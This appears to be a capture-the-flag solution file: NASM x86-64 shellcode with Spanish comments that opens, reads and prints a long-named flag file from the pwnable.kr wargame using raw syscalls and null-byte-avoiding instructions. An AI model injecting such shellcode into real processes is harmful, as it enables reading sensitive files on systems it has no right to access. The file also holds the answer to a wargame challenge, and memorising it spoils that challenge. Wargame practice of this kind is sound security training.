BITS 64
; nasm -f bin shellcode.asm

call _readfile
db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0


_readfile:
; "open" file
  pop rdi ; apuntar al nombre del archivo
  xor rax, rax
  add al, 2    ; syscall "open" (2)
  xor rsi, rsi ; O_RDONLY
  syscall

; "read" file
  sub sp, 0xfff   ; reservar espacio en la pila
  lea rsi, [rsp]  ; apuntar al tope de la pila
  mov rdi, rax    ; fd de open a read   
  xor rdx, rdx    
  mov dx, 0xfff   ; numero de bytes a leer
  xor rax, rax    ; syscall "read" (0)
  syscall

; "write" to stdout
  xor rdi, rdi
  add dil, 1      ; fd "stdout" (1)
  mov rdx, rax    ; numero de bytes a escribir
  xor rax, rax    
  add al, 1       ; syscall "write" (1)
  syscall

; exit
  mov rax,60      ; syscall "exit" (60)
  xor rdi,rdi     ; exit(0)
  syscall
